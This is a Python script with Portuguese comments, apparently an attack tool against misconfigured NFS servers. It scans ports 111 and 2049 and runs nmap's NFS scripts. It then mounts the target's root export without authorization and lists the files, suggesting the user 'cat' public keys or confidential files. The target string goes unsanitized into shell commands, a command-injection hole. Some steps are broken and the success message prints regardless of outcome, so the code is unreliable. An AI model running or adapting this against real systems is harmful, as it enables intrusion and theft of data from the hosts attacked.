#!/usr/bin/env python3

import os
#instala o python-nmap
os.system('pip install python-nmap' + ' > /dev/null')
#instala o tree
os.system('sudo apt-get install tree' + ' > /dev/null')

import sys
import nmap
import time


def scan(host):
    
    try:
    
        #criando um scanner
        scanner = nmap.PortScanner()
        
        #verificando as portas
        scanner.scan(host, '111,2049')
        
        #imprimindo o status da porta 111
        time.sleep(3)
        print('Status da porta 111:', scanner[host]['tcp'][111]['state'])

        #imprimindo o status da porta 2049
        time.sleep(3)
        print('Status da porta 2049:', scanner[host]['tcp'][2049]['state'])

        #procura pela vulnerabilidade
        time.sleep(3)
        print('Executando o nmap e buscando por vulnerabilidades...')
        time.sleep(1)
        os.system('sudo nmap --script nfs* ' + host + ' -sV -p111,2049')
        
        #mostra nfs shares disponíveis
        time.sleep(1)
        print('\n\nMostrando nfs shares disponíveis...')
        time.sleep(4)
        os.system('showmount -e ' + host)
        
        #monta nfs share
        time.sleep(1)
        print('\n\nMontando NFS SHARE...')
        time.sleep(4)
        os.system('mkdir target-NFS')
        os.system('mount -t nfs ' + host + ':/ ./target-NFS/ -o nolock')
        os.system('cd target-NFS')
        os.system('tree .')
        time.sleep(4)
        
        #lista os arquivos expostos nos NF SHARE do host
        print('\n\Listando os arquivos expostos no NFS SHARE do host')
        os.system('ls -ln mnt/nfs/')
        time.sleep(2)
        print('NFS SHARE do host ' + host + 'exploitado com SUCESSO!')
        time.sleep(2)
        print('\n*Você pode usar comandos como "cat" para pegar chaves públicas ou outros arquivos confidênciais')
        
        
        
            
    except:
        print('O host/portas não estão respondendo, pode haver algum firewall bloqueando ou host não existe.')
    
#print("O host " + host + " não está vulnerável ao ataque NFS.")    
#time.sleep(2) # espera por 2 segundos

######## args
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print('Parâmetros incorretos. Por favor utilize \"--target <host>\"')
        exit(1)

    if sys.argv[1] == '--target':
        host = sys.argv[2]
        result = scan(host)        
    else:
        print('Parâmetros incorretos. Por favor utilize \"--target <host>\"')
        exit(1)
